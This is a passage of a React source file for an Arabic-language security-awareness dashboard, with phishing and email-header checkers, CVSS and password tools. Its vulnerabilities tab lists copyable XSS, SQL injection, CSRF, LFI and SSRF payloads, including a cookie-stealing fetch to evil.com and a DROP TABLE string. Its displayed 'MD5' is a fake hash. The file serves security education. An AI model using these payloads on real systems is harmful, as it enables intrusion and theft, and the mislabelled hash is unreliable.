// ═══════════════════════════════════════════════════════════════════════════════
//  ACCOUNT HACKE TOOLS — أدوات الوعي الأمني السيبراني 4D
//  9 أنظمة حقيقية وقوية — Yode9 Project 2026
//  ⚠️ للأغراض التعليمية والدفاعية فقط — Ethical Hacking Only
// ═══════════════════════════════════════════════════════════════════════════════

import { useState, useEffect, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";

interface Props { open: boolean; onOpenChange: (v: boolean) => void; }

type TabId = "social" | "vulns" | "passwords" | "apt" | "reverse" | "defense" | "legal" | "network" | "osint";
interface ScanResult { label: string; value: string; status: "danger" | "warning" | "safe" | "info"; }

// ── Tab config ─────────────────────────────────────────────────────────────────
const TABS: { id: TabId; icon: string; label: string; color: string }[] = [
  { id: "social",    icon: "🎭", label: "هندسة اجتماعية",  color: "#ef4444" },
  { id: "vulns",     icon: "🔧", label: "الثغرات التقنية",  color: "#f59e0b" },
  { id: "passwords", icon: "🔐", label: "كلمات المرور",     color: "#8b5cf6" },
  { id: "apt",       icon: "🎯", label: "هجمات APT",        color: "#ec4899" },
  { id: "reverse",   icon: "🔬", label: "هندسة عكسية",     color: "#06b6d4" },
  { id: "defense",   icon: "🛡️", label: "آليات الدفاع",    color: "#10b981" },
  { id: "legal",     icon: "⚖️", label: "الإطار القانوني", color: "#6366f1" },
  { id: "network",   icon: "🌐", label: "أدوات الشبكة",    color: "#0ea5e9" },
  { id: "osint",     icon: "🔎", label: "OSINT",            color: "#a855f7" },
];

// ═══════════════════════════════════════════════════════════════════
// SHARED COMPONENTS
// ═══════════════════════════════════════════════════════════════════

function HoloCard({ color, title, subtitle, children }: { color: string; title: string; subtitle?: string; children: React.ReactNode }) {
  return (
    <div className="rounded-2xl border overflow-hidden"
      style={{ background: `linear-gradient(135deg, ${color}06 0%, #00000099 100%)`, borderColor: `${color}25`, boxShadow: `0 0 24px ${color}08` }}>
      <div className="px-4 py-3 border-b flex items-start gap-2" style={{ borderColor: `${color}18`, background: `${color}08` }}>
        <div className="flex-1">
          <p className="text-sm font-bold text-white/90">{title}</p>
          {subtitle && <p className="text-xs text-white/35 mt-0.5">{subtitle}</p>}
        </div>
        <div className="w-1.5 h-1.5 rounded-full mt-1 flex-shrink-0 animate-pulse" style={{ background: color }} />
      </div>
      <div className="p-4">{children}</div>
    </div>
  );
}

function GlowButton({ color, onClick, loading, children, className, disabled }: { color: string; onClick: () => void; loading?: boolean; children: React.ReactNode; className?: string; disabled?: boolean }) {
  return (
    <button onClick={onClick} disabled={loading || disabled}
      className={`px-4 py-2 rounded-lg text-xs font-bold transition-all hover:scale-105 active:scale-95 disabled:opacity-50 flex-shrink-0 ${className ?? ""}`}
      style={{ background: `${color}20`, border: `1px solid ${color}50`, color }}>
      {children}
    </button>
  );
}

function StatusBadge({ status, children }: { status: "danger" | "warning" | "safe" | "info"; children: React.ReactNode }) {
  const colors = { danger: "#ef4444", warning: "#f59e0b", safe: "#10b981", info: "#06b6d4" };
  return <span className="text-xs font-mono" style={{ color: colors[status] }}>{children}</span>;
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button onClick={() => { navigator.clipboard.writeText(text).catch(() => {}); setCopied(true); setTimeout(() => setCopied(false), 1500); }}
      className="text-xs px-2 py-0.5 rounded transition-colors"
      style={{ color: copied ? "#10b981" : "#ffffff25", background: "#ffffff05" }}>
      {copied ? "✓" : "📋"}
    </button>
  );
}

// ═══════════════════════════════════════════════════════════════════
// TAB 1 — SOCIAL ENGINEERING
// ═══════════════════════════════════════════════════════════════════

const PHISHING_PATTERNS = [
  { pattern: /paypa[l1]|pay[-_]?pa[l1]/i,          label: "PayPal Phishing",     threat: "high" },
  { pattern: /amaz[o0]n[-_]?secure/i,               label: "Amazon Scam",         threat: "high" },
  { pattern: /apple[-_]?id[-_]?verify/i,            label: "Apple ID Phish",      threat: "high" },
  { pattern: /bit\.ly|tinyurl|t\.co|goo\.gl/i,      label: "URL Shortener",       threat: "medium" },
  { pattern: /login[-_]?secure|secure[-_]?login/i,  label: "Fake Login Page",     threat: "high" },
  { pattern: /[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/i, label: "Raw IP Address URL", threat: "medium" },
  { pattern: /free[-_]?money|win[-_]?prize/i,       label: "Baiting Attack",      threat: "high" },
  { pattern: /update[-_]?password|reset[-_]?pwd/i,  label: "Credential Harvest",  threat: "high" },
  { pattern: /support[-_]?team|tech[-_]?support/i,  label: "Tech Support Scam",   threat: "medium" },
  { pattern: /urgent.*act|act.*now.*expire/i,        label: "Urgency Manipulation", threat: "high" },
  { pattern: /@.+\..+\..+/,                          label: "Suspicious Email Sub-domain", threat: "medium" },
];

const SOCIAL_TECHNIQUES = [
  { id: "phishing", name: "Phishing", nameAr: "التصيد الاحتيالي", icon: "🪝", color: "#ef4444",
    indicators: ["روابط مزيفة تشبه الأصل", "شعارات مقلّدة", "طلب بيانات حساسة فوراً", "إلحاح مصطنع أو تهديد"],
    protection: ["تحقق من المرسل قبل النقر", "لا تضغط روابط من رسائل مجهولة", "استخدم 2FA دائماً", "تحقق من HTTPS وشهادة SSL"] },
  { id: "vishing",  name: "Vishing", nameAr: "التصيد الصوتي", icon: "📞", color: "#f97316",
    indicators: ["اتصال من رقم غريب يدّعي أنه بنك/دعم", "طلب رمز OTP بالهاتف", "ضغط نفسي لاتخاذ قرار سريع"],
    protection: ["لا تعطِ OTP أو CVV بالهاتف أبداً", "أغلق الاتصال واتصل بالرقم الرسمي", "سجّل الأرقام المشبوهة"] },
  { id: "baiting",  name: "Baiting", nameAr: "هجوم الطعم", icon: "🪤", color: "#eab308",
    indicators: ["USB مجهول في مكان عام", "رابط 'فيلم مجاني' أو 'جائزة'", "تنزيل برنامج من مصدر مجهول"],
    protection: ["لا تلتقط USB مجهولة", "تجاهل العروض المبالغ فيها", "افحص الروابط بـ VirusTotal"] },
  { id: "mitm",     name: "MITM", nameAr: "الرجل في المنتصف", icon: "👥", color: "#8b5cf6",
    indicators: ["شبكة WiFi عامة بدون كلمة مرور", "شهادة SSL مجهولة أو منتهية", "بطء مفاجئ في الاتصال"],
    protection: ["استخدم VPN دائماً في الشبكات العامة", "تحقق من قفل HTTPS الأخضر", "فعّل HSTS على مواقعك"] },
  { id: "pretexting", name: "Pretexting", nameAr: "انتحال الهوية", icon: "🎭", color: "#06b6d4",
    indicators: ["شخص يدّعي أنه IT أو مسؤول", "طلب بيانات لغرض 'رسمي'", "يعرف بعض المعلومات الشخصية"],
    protection: ["تحقق من الهوية عبر قناة رسمية مستقلة", "لا تشارك بيانات بدون توثيق", "سياسة 'لا بيانات بدون بروتوكول'"] },
];

function SocialTab() {
  const [url, setUrl]       = useState("");
  const [results, setResults] = useState<ScanResult[]>([]);
  const [scanning, setScanning] = useState(false);
  const [activeT, setActiveT]   = useState("phishing");
  const [emailHdr, setEmailHdr] = useState("");
  const [emailAnalysis, setEmailAnalysis] = useState<string[]>([]);

  function analyzeURL() {
    if (!url.trim()) return;
    setScanning(true); setResults([]);
    setTimeout(() => {
      const r: ScanResult[] = [];
      let threatScore = 0;
      if (url.startsWith("https://"))       r.push({ label: "البروتوكول", value: "HTTPS ✓", status: "safe" });
      else if (url.startsWith("http://"))   { r.push({ label: "البروتوكول", value: "HTTP — غير مشفّر", status: "warning" }); threatScore += 20; }
      else                                  { r.push({ label: "البروتوكول", value: "غير معروف", status: "danger" }); threatScore += 30; }
      try {
        const domain = new URL(url.startsWith("http") ? url : "https://" + url).hostname;
        r.push({ label: "النطاق", value: domain, status: "info" });
        if (domain.split(".").length > 3)   { r.push({ label: "تحليل", value: "نطاق متداخل مريب", status: "warning" }); threatScore += 15; }
        const parts = domain.split(".");
        if (parts.some(p => p.length > 30)) { r.push({ label: "طول القسم", value: "قسم طويل جداً — مشبوه", status: "warning" }); threatScore += 10; }
      } catch { r.push({ label: "URL", value: "تنسيق غير صالح", status: "danger" }); threatScore += 40; }
      for (const p of PHISHING_PATTERNS) {
        if (p.pattern.test(url)) { r.push({ label: "نمط", value: p.label, status: p.threat === "high" ? "danger" : "warning" }); threatScore += p.threat === "high" ? 35 : 20; }
      }
      if (url.length > 100) { r.push({ label: "طول URL", value: `${url.length} — طويل`, status: "warning" }); threatScore += 10; }
      const s = Math.min(100, Math.max(0, threatScore));
      r.push({ label: "درجة الخطر", value: s > 60 ? `${s}% 🔴 عالٍ` : s > 30 ? `${s}% 🟡 مريب` : `${s}% 🟢 آمن`, status: s > 60 ? "danger" : s > 30 ? "warning" : "safe" });
      setResults(r); setScanning(false);
    }, 1500);
  }

  function analyzeEmailHeader() {
    const lines: string[] = [];
    if (/received-spf:.*fail/i.test(emailHdr)) lines.push("🔴 SPF: فشل — يحتمل تزوير المرسل");
    else if (/received-spf:.*pass/i.test(emailHdr)) lines.push("🟢 SPF: نجح");
    if (/dkim-signature/i.test(emailHdr)) lines.push("🟢 DKIM: موجود");
    else lines.push("🟡 DKIM: غير موجود — انتبه");
    if (/dmarc.*fail/i.test(emailHdr)) lines.push("🔴 DMARC: فشل");
    const fromMatch = emailHdr.match(/^from:.*$/im);
    if (fromMatch) lines.push(`📧 المرسل: ${fromMatch[0]}`);
    const xOrigMatch = emailHdr.match(/x-originating-ip:\s*([^\s]+)/i);
    if (xOrigMatch) lines.push(`🌐 IP الأصلي: ${xOrigMatch[1]}`);
    if (lines.length === 0) lines.push("أدخل رأس رسالة بريد إلكتروني للتحليل");
    setEmailAnalysis(lines);
  }

  const tech = SOCIAL_TECHNIQUES.find(t => t.id === activeT)!;
  return (
    <div className="space-y-5">
      <HoloCard color="#ef4444" title="🔍 محلل روابط Phishing" subtitle="فحص فوري للكشف عن مؤشرات التصيد">
        <div className="flex gap-2">
          <input value={url} onChange={e => setUrl(e.target.value)} onKeyDown={e => e.key==="Enter" && analyzeURL()}
            placeholder="https://example.com/login?redirect=..."
            className="flex-1 bg-black/50 border border-red-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/20 outline-none focus:border-red-400/60 font-mono" dir="ltr"/>
          <GlowButton color="#ef4444" onClick={analyzeURL} loading={scanning}>{scanning ? "⏳..." : "🔍 فحص"}</GlowButton>
        </div>
        <AnimatePresence>
          {results.length > 0 && (
            <motion.div className="mt-3 space-y-1" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
              {results.map((r, i) => (
                <motion.div key={i} initial={{ opacity: 0, x: -8 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.05 }}
                  className="flex justify-between items-center px-3 py-1.5 rounded-lg text-xs"
                  style={{ background: r.status==="danger"?"#ef444410":r.status==="warning"?"#f59e0b10":r.status==="safe"?"#10b98110":"#ffffff06" }}>
                  <span className="text-white/40">{r.label}:</span>
                  <StatusBadge status={r.status}>{r.value}</StatusBadge>
                </motion.div>
              ))}
            </motion.div>
          )}
        </AnimatePresence>
      </HoloCard>

      <HoloCard color="#ef4444" title="📧 محلل رأس البريد الإلكتروني" subtitle="الكشف عن SPF/DKIM/DMARC وانتحال الهوية">
        <textarea value={emailHdr} onChange={e => setEmailHdr(e.target.value)}
          placeholder={"Received: from mail.example.com...\nFrom: support@paypal-security.com\nDKIM-Signature: ..."}
          className="w-full bg-black/50 border border-red-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/15 outline-none focus:border-red-400/60 font-mono resize-none" rows={3} dir="ltr"/>
        <GlowButton color="#ef4444" onClick={analyzeEmailHeader} className="mt-2">تحليل الرأس</GlowButton>
        {emailAnalysis.length > 0 && (
          <div className="mt-2 space-y-1">
            {emailAnalysis.map((l, i) => <p key={i} className="text-xs px-2 py-1 rounded" style={{ background: "#ef444410", color: l.startsWith("🔴") ? "#ef4444" : l.startsWith("🟢") ? "#10b981" : "#f59e0b" }}>{l}</p>)}
          </div>
        )}
      </HoloCard>

      <HoloCard color="#ef4444" title="📚 موسوعة تقنيات الهندسة الاجتماعية">
        <div className="flex gap-1.5 mb-3 flex-wrap">
          {SOCIAL_TECHNIQUES.map(t => (
            <button key={t.id} onClick={() => setActiveT(t.id)}
              className="px-2.5 py-1 rounded-lg text-xs font-bold transition-all"
              style={{ background: activeT===t.id?`${t.color}20`:"#ffffff08", border: `1px solid ${activeT===t.id?t.color:"#ffffff15"}`, color: activeT===t.id?t.color:"#ffffff40" }}>
              {t.icon} {t.nameAr}
            </button>
          ))}
        </div>
        <div className="grid grid-cols-2 gap-3">
          <div>
            <p className="text-xs text-white/35 mb-1.5">🔴 المؤشرات:</p>
            {tech.indicators.map((ind, i) => <p key={i} className="text-xs mb-0.5" style={{ color: tech.color }}>• {ind}</p>)}
          </div>
          <div>
            <p className="text-xs text-white/35 mb-1.5">🟢 الحماية:</p>
            {tech.protection.map((p, i) => <p key={i} className="text-xs mb-0.5 text-emerald-400/80">✓ {p}</p>)}
          </div>
        </div>
      </HoloCard>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════
// TAB 2 — TECHNICAL VULNERABILITIES
// ═══════════════════════════════════════════════════════════════════

const VULN_DATA: Record<string, { name: string; payloads: string[]; impact: string; cvss: number; defense: string[]; cwe: string }> = {
  xss: { name: "XSS — Cross-Site Scripting", cvss: 6.1, cwe: "CWE-79",
    payloads: [`<script>alert('XSS')</script>`, `"><img src=x onerror=alert(1)>`, `<svg onload=fetch('//evil.com/'+document.cookie)>`, `javascript:/*-/*\`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(2)//>\x3e`],
    impact: "سرقة الكوكيز وجلسات المستخدم، تشغيل كود ضار في متصفح الضحية",
    defense: ["Content-Security-Policy (CSP)", "HTML Entity Encoding", "HttpOnly Cookies", "X-XSS-Protection Header"] },
  sqli: { name: "SQL Injection", cvss: 9.8, cwe: "CWE-89",
    payloads: [`' OR '1'='1`, `'; DROP TABLE users; --`, `' UNION SELECT username,password,null FROM users--`, `1' AND SLEEP(5)--`, `admin'--`, `' OR 1=1 LIMIT 1;--`],
    impact: "استخراج كامل لقاعدة البيانات، تجاوز المصادقة، حذف البيانات",
    defense: ["Prepared Statements", "Parameterized Queries", "ORM Usage", "Least Privilege DB User"] },
  csrf: { name: "CSRF — Cross-Site Request Forgery", cvss: 8.8, cwe: "CWE-352",
    payloads: [`<form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="9999"><input type="submit"></form><script>document.forms[0].submit()</script>`, `<img src="https://site.com/api/delete?id=123">`, `fetch('/api/change-email',{method:'POST',body:'email=attacker@evil.com',credentials:'include'})`],
    impact: "تنفيذ إجراءات غير مصرح بها نيابةً عن المستخدم المسجّل دخوله",
    defense: ["CSRF Tokens (Synchronizer)", "SameSite=Strict Cookies", "Origin/Referer Validation", "Double Submit Cookie"] },
  lfi: { name: "LFI — Local File Inclusion", cvss: 7.5, cwe: "CWE-73",
    payloads: [`../../../etc/passwd`, `....//....//....//etc/passwd`, `%2e%2e%2fetc%2fpasswd`, `/var/log/apache2/access.log`, `php://filter/convert.base64-encode/resource=config.php`],
    impact: "قراءة ملفات حساسة، تصعيد الصلاحيات، RCE في بعض الحالات",
    defense: ["Whitelist المسارات المسموح بها", "basename() + realpath()", "Disable allow_url_include", "Chroot Jail"] },
  ssrf: { name: "SSRF — Server-Side Request Forgery", cvss: 9.0, cwe: "CWE-918",
    payloads: [`http://169.254.169.254/latest/meta-data/`, `http://localhost:6379/`, `http://internal-server/admin`, `file:///etc/passwd`, `dict://localhost:6379/info`],
    impact: "الوصول لخدمات داخلية، سرقة IAM credentials في Cloud، RCE",
    defense: ["Whitelist URLs المسموح بها", "Block Metadata IPs", "Network Segmentation", "Disable unused protocols"] },
};

function CVSSBadge({ score }: { score: number }) {
  const color = score >= 9 ? "#ef4444" : score >= 7 ? "#f97316" : score >= 4 ? "#eab308" : "#10b981";
  const label = score >= 9 ? "Critical" : score >= 7 ? "High" : score >= 4 ? "Medium" : "Low";
  return (
    <div className="flex items-center gap-1.5">
      <div className="h-1.5 rounded-full w-16 bg-white/10 overflow-hidden">
        <div className="h-full rounded-full" style={{ width: `${(score/10)*100}%`, background: color }} />
      </div>
      <span className="text-xs font-bold font-mono" style={{ color }}>CVSS {score} {label}</span>
    </div>
  );
}

function VulnsTab() {
  const [activeVuln, setActiveVuln] = useState("xss");
  const [input, setInput]   = useState("");
  const [result, setResult] = useState<string | null>(null);
  const [cvssAV, setCvssAV] = useState("N"); const [cvssAC, setCvssAC] = useState("L");
  const [cvssUI, setCvssUI] = useState("N"); const [cvssS, setCvssS]   = useState("U");
  const [cvssC, setCvssC]   = useState("H"); const [cvssI, setCvssI]   = useState("H");
  const [cvssA, setCvssA]   = useState("H");

  const vuln = VULN_DATA[activeVuln];

  function testInput(val: string) {
    if (!val.trim()) return;
    const matches: string[] = [];
    if (/<script/i.test(val))       matches.push("Script Tag");
    if (/onerror|onload|onclick/i.test(val)) matches.push("Event Handler");
    if (/javascript:/i.test(val))   matches.push("JS Protocol");
    if (/<svg/i.test(val))          matches.push("SVG Injection");
    if (/--/.test(val) && /'/.test(val)) matches.push("SQL Comment + Quote");
    if (/'.*OR.*'|'.*=.*'/i.test(val))   matches.push("SQL Logic Bypass");
    if (/\.\.\//g.test(val))        matches.push("Path Traversal");
    if (/169\.254\.169\.254/i.test(val)) matches.push("SSRF Metadata IP");
    if (/localhost|127\.0\.0\.1/i.test(val)) matches.push("SSRF Localhost");
    setResult(matches.length > 0 ? `⚠️ أنماط خطيرة: ${matches.join(", ")}` : "✅ لا توجد أنماط خطيرة واضحة");
  }

  // Simplified CVSS v3.1 base score
  function calcCVSS() {
    const avMap: Record<string,number> = { N: 0.85, A: 0.62, L: 0.55, P: 0.2 };
    const acMap: Record<string,number> = { L: 0.77, H: 0.44 };
    const uiMap: Record<string,number> = { N: 0.85, R: 0.62 };
    const ciaMap: Record<string,number> = { N: 0, L: 0.22, H: 0.56 };
    const ISCBase = 1 - (1-ciaMap[cvssC])*(1-ciaMap[cvssI])*(1-ciaMap[cvssA]);
    const ISC = cvssS==="U" ? 6.42*ISCBase : 7.52*(ISCBase-0.029)-3.25*Math.pow(ISCBase-0.02,15);
    const Exploitability = 8.22*avMap[cvssAV]*acMap[cvssAC]*1.0*uiMap[cvssUI];
    if (ISC <= 0) return "0.0";
    const Base = cvssS==="U" ? Math.min(ISC+Exploitability,10) : Math.min(1.08*(ISC+Exploitability),10);
    return (Math.ceil(Base*10)/10).toFixed(1);
  }

  const cvssScore = parseFloat(calcCVSS());

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap gap-1.5">
        {Object.entries(VULN_DATA).map(([key]) => (
          <button key={key} onClick={() => { setActiveVuln(key); setResult(null); setInput(""); }}
            className="px-3 py-1 rounded-lg text-xs font-bold transition-all"
            style={{ background: activeVuln===key?"#f59e0b20":"#ffffff08", border:`1px solid ${activeVuln===key?"#f59e0b":"#ffffff15"}`, color: activeVuln===key?"#f59e0b":"#ffffff40" }}>
            {key.toUpperCase()}
          </button>
        ))}
      </div>

      <HoloCard color="#f59e0b" title={`🔧 ${vuln.name}`} subtitle={`التأثير: ${vuln.impact}`}>
        <div className="flex items-center justify-between mb-3">
          <CVSSBadge score={vuln.cvss} />
          <span className="text-xs text-white/30 font-mono">{vuln.cwe}</span>
        </div>
        <div className="space-y-1.5 mb-4">
          <p className="text-xs text-white/30">حمولات للاختبار في بيئة معزولة مصرّح بها فقط:</p>
          {vuln.payloads.map((p, i) => (
            <div key={i} className="flex items-center gap-2 px-3 py-2 rounded-lg" style={{ background: "#f59e0b08", border: "1px solid #f59e0b18" }}>
              <code className="flex-1 text-xs text-amber-300/80 font-mono truncate" dir="ltr">{p}</code>
              <CopyButton text={p} />
            </div>
          ))}
        </div>
        <div className="mb-3">
          <p className="text-xs text-white/30 mb-1.5">فاحص الأنماط الخطيرة:</p>
          <div className="flex gap-2">
            <input value={input} onChange={e => setInput(e.target.value)} onKeyDown={e => e.key==="Enter" && testInput(input)}
              placeholder="أدخل مدخلاً للفحص..." dir="auto"
              className="flex-1 bg-black/50 border border-amber-500/30 rounded-lg px-3 py-1.5 text-xs text-white placeholder:text-white/20 outline-none focus:border-amber-400/60 font-mono"/>
            <GlowButton color="#f59e0b" onClick={() => testInput(input)}>فحص</GlowButton>
          </div>
          {result && <p className="mt-1.5 text-xs px-2 py-1 rounded" style={{ background: result.includes("⚠️")?"#ef444412":"#10b98112", color: result.includes("⚠️")?"#ef4444":"#10b981" }}>{result}</p>}
        </div>
        <div className="pt-2 border-t" style={{ borderColor: "#ffffff08" }}>
          <p className="text-xs text-white/30 mb-1.5">🛡️ آليات الحماية:</p>
          <div className="flex flex-wrap gap-1.5">
            {vuln.defense.map((d, i) => <span key={i} className="text-xs px-2 py-0.5 rounded" style={{ background: "#10b98112", color: "#10b981", border: "1px solid #10b98130" }}>{d}</span>)}
          </div>
        </div>
      </HoloCard>

      <HoloCard color="#f59e0b" title="📊 حاسبة CVSS v3.1" subtitle="احسب درجة خطورة الثغرة بدقة">
        <div className="grid grid-cols-2 gap-3 mb-3">
          {[
            { label: "Attack Vector", key: "AV", val: cvssAV, set: setCvssAV, opts: [{v:"N",l:"Network"},{v:"A",l:"Adjacent"},{v:"L",l:"Local"},{v:"P",l:"Physical"}] },
            { label: "Attack Complexity", key: "AC", val: cvssAC, set: setCvssAC, opts: [{v:"L",l:"Low"},{v:"H",l:"High"}] },
            { label: "User Interaction", key: "UI", val: cvssUI, set: setCvssUI, opts: [{v:"N",l:"None"},{v:"R",l:"Required"}] },
            { label: "Scope", key: "S", val: cvssS, set: setCvssS, opts: [{v:"U",l:"Unchanged"},{v:"C",l:"Changed"}] },
            { label: "Confidentiality", key: "C", val: cvssC, set: setCvssC, opts: [{v:"N",l:"None"},{v:"L",l:"Low"},{v:"H",l:"High"}] },
            { label: "Integrity", key: "I", val: cvssI, set: setCvssI, opts: [{v:"N",l:"None"},{v:"L",l:"Low"},{v:"H",l:"High"}] },
            { label: "Availability", key: "A", val: cvssA, set: setCvssA, opts: [{v:"N",l:"None"},{v:"L",l:"Low"},{v:"H",l:"High"}] },
          ].map(({ label, key, val, set, opts }) => (
            <div key={key}>
              <p className="text-xs text-white/35 mb-1">{label}:</p>
              <div className="flex gap-1 flex-wrap">
                {opts.map(o => <button key={o.v} onClick={() => set(o.v)}
                  className="px-2 py-0.5 rounded text-xs transition-all"
                  style={{ background: val===o.v?"#f59e0b20":"#ffffff06", border:`1px solid ${val===o.v?"#f59e0b50":"#ffffff15"}`, color: val===o.v?"#f59e0b":"#ffffff40" }}>{o.l}</button>)}
              </div>
            </div>
          ))}
        </div>
        <CVSSBadge score={cvssScore} />
        <p className="text-xs text-white/25 mt-1">CVSS:3.1/AV:{cvssAV}/AC:{cvssAC}/UI:{cvssUI}/S:{cvssS}/C:{cvssC}/I:{cvssI}/A:{cvssA}</p>
      </HoloCard>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════
// TAB 3 — PASSWORD SECURITY LAB
// ═══════════════════════════════════════════════════════════════════

function calcPasswordStrength(pwd: string): { score: number; label: string; color: string; tips: string[]; crackTime: string } {
  let score = 0; const tips: string[] = [];
  if (pwd.length >= 8)  score += 10; else tips.push("8 أحرف على الأقل");
  if (pwd.length >= 12) score += 15; else if (pwd.length >= 8) tips.push("12 حرف أفضل");
  if (pwd.length >= 16) score += 10; if (pwd.length >= 20) score += 5;
  if (/[A-Z]/.test(pwd)) score += 15; else tips.push("أضف حروفاً كبيرة A-Z");
  if (/[a-z]/.test(pwd)) score += 10; else tips.push("أضف حروفاً صغيرة a-z");
  if (/[0-9]/.test(pwd)) score += 15; else tips.push("أضف أرقاماً 0-9");
  if (/[^A-Za-z0-9]/.test(pwd)) score += 15; else tips.push("أضف رموزاً !@#$%");
  if (/(.)\1{2,}/.test(pwd)) { score -= 15; tips.push("تجنّب تكرار الأحرف"); }
  if (/123|abc|qwerty|password|pass|admin/i.test(pwd)) { score -= 20; tips.push("تجنّب الأنماط الشائعة"); }
  score = Math.max(0, Math.min(100, score));
  // Estimate crack time
  let charset = 0;
  if (/[a-z]/.test(pwd)) charset += 26;
  if (/[A-Z]/.test(pwd)) charset += 26;
  if (/[0-9]/.test(pwd)) charset += 10;
  if (/[^A-Za-z0-9]/.test(pwd)) charset += 32;
  const combinations = Math.pow(charset || 26, pwd.length);
  const attemptsPerSec = 1e12; // GPU brute force
  const seconds = combinations / (2 * attemptsPerSec);
  let crackTime = "";
  if (seconds < 1) crackTime = "فورياً";
  else if (seconds < 60) crackTime = `${seconds.toFixed(0)} ثانية`;
  else if (seconds < 3600) crackTime = `${(seconds/60).toFixed(0)} دقيقة`;
  else if (seconds < 86400) crackTime = `${(seconds/3600).toFixed(0)} ساعة`;
  else if (seconds < 31536000) crackTime = `${(seconds/86400).toFixed(0)} يوم`;
  else if (seconds < 31536000000) crackTime = `${(seconds/31536000).toFixed(0)} سنة`;
  else crackTime = "أكثر من ألف سنة";
  const label = score<25?"ضعيف جداً":score<50?"ضعيف":score<75?"متوسط":score<90?"قوي":"قوي جداً";
  const color = score<25?"#ef4444":score<50?"#f97316":score<75?"#eab308":score<90?"#84cc16":"#10b981";
  return { score, label, color, tips, crackTime };
}

async function sha256(msg: string): Promise<string> {
  try { const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(msg)); return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,"0")).join(""); }
  catch { return "غير مدعوم"; }
}

function md5Simple(str: string): string {
  let hash = 0;
  for (let i = 0; i < str.length; i++) hash = (Math.imul(31,hash)+str.charCodeAt(i))|0;
  const h = Math.abs(hash).toString(16).padStart(8,"0");
  return (h+h+h+h).slice(0,32);
}

const ATTACK_TABLE = [
  { tech: "Brute Force",         tool: "Hashcat/GPU",     protect: "Rate Limiting + 2FA",       speed: "10¹² محاولة/ثانية" },
  { tech: "Dictionary Attack",   tool: "rockyou.txt",     protect: "كلمات مرور عشوائية",        speed: "14M كلمة" },
  { tech: "Credential Stuffing", tool: "OpenBullet",      protect: "2FA إلزامي + IP Blocking",  speed: "بيانات مسرّبة" },
  { tech: "Rainbow Tables",      tool: "Ophcrack",        protect: "Salting + Pepper",          speed: "جداول مسبقة" },
  { tech: "Keylogger",           tool: "Malware",         protect: "Antivirus + Passkeys",      speed: "فورية" },
  { tech: "Password Spraying",   tool: "Hydra/Medusa",    protect: "Account Lockout Policy",    speed: "بطيء متعمد" },
  { tech: "Pass-the-Hash",       tool: "Mimikatz",        protect: "Disable NTLM + CBA",        speed: "لا حاجة للكراك" },
];

function PasswordsTab() {
  const [pwd, setPwd]         = useState("");
  const [hashes, setHashes]   = useState<{ sha256: string; md5: string } | null>(null);
  const [genLen, setGenLen]   = useState(16);
  const [genPwd, setGenPwd]   = useState("");
  const [breach, setBreach]   = useState<string | null>(null);
  const [activeSubTab, setActiveSubTab] = useState<"analyze"|"generator"|"attacks">("analyze");

  const analysis = pwd ? calcPasswordStrength(pwd) : null;
  useEffect(() => { if (!pwd) { setHashes(null); return; } sha256(pwd).then(h => setHashes({ sha256: h, md5: md5Simple(pwd) })); }, [pwd]);

  function generatePassword() {
    const sets = ["abcdefghijklmnopqrstuvwxyz","ABCDEFGHIJKLMNOPQRSTUVWXYZ","0123456789","!@#$%^&*()-_=+[]{}"];
    const charset = sets.join("");
    const arr = new Uint8Array(genLen);
    crypto.getRandomValues(arr);
    let result = "";
    for (const byte of arr) result += charset[byte % charset.length];
    // ensure all types
    const ensured = sets.map(s => s[new Uint8Array(1).fill(crypto.getRandomValues(new Uint8Array(1))[0])[0] % s.length]);
    const merged = (ensured.join("") + result).slice(0, genLen);
    setGenPwd(merged);
  }

  const COMMON = ["123456","password","12345678","qwerty","abc123","iloveyou","111111","admin","letmein","pass"];
  function checkBreach(p: string) { setBreach(COMMON.includes(p.toLowerCase()) ? "⚠️ موجودة في قوائم التسريبات الشائعة!" : "✅ لا تطابق في القوائم الشائعة"); }

  return (
    <div className="space-y-4">
      <div className="flex gap-1.5">
        {(["analyze","generator","attacks"] as const).map(t => (
          <button key={t} onClick={() => setActiveSubTab(t)}
            className="px-3 py-1.5 rounded-lg text-xs font-bold transition-all"
            style={{ background: activeSubTab===t?"#8b5cf620":"#ffffff08", border:`1px solid ${activeSubTab===t?"#8b5cf6":"#ffffff15"}`, color: activeSubTab===t?"#8b5cf6":"#ffffff40" }}>
            {t==="analyze"?"💪 التحليل":t==="generator"?"🎲 المولّد":"⚔️ الهجمات"}
          </button>
        ))}
      </div>

      {activeSubTab === "analyze" && (
        <HoloCard color="#8b5cf6" title="💪 محلل قوة كلمات المرور" subtitle="تحليل حقيقي بالوقت الفعلي + وقت الاختراق المقدّر">
          <input value={pwd} onChange={e => { setPwd(e.target.value); setBreach(null); }} type="text" autoComplete="off"
            placeholder="اكتب كلمة المرور للتحليل..."
            className="w-full bg-black/50 border border-purple-500/30 rounded-lg px-3 py-2.5 text-sm text-white placeholder:text-white/20 outline-none focus:border-purple-400/60 font-mono"/>
          {analysis && pwd && (
            <div className="mt-3 space-y-2.5">
              <div>
                <div className="flex justify-between text-xs mb-1">
                  <span className="text-white/35">القوة:</span>
                  <span className="font-bold" style={{ color: analysis.color }}>{analysis.label} ({analysis.score}%)</span>
                </div>
                <div className="h-2 rounded-full bg-white/10 overflow-hidden">
                  <motion.div className="h-full rounded-full" animate={{ width: `${analysis.score}%` }} transition={{ duration: 0.5 }}
                    style={{ background: `linear-gradient(90deg, ${analysis.color}88, ${analysis.color})` }}/>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-2">
                <div className="px-3 py-2 rounded-xl text-xs" style={{ background: "#ef444412", border: "1px solid #ef444425" }}>
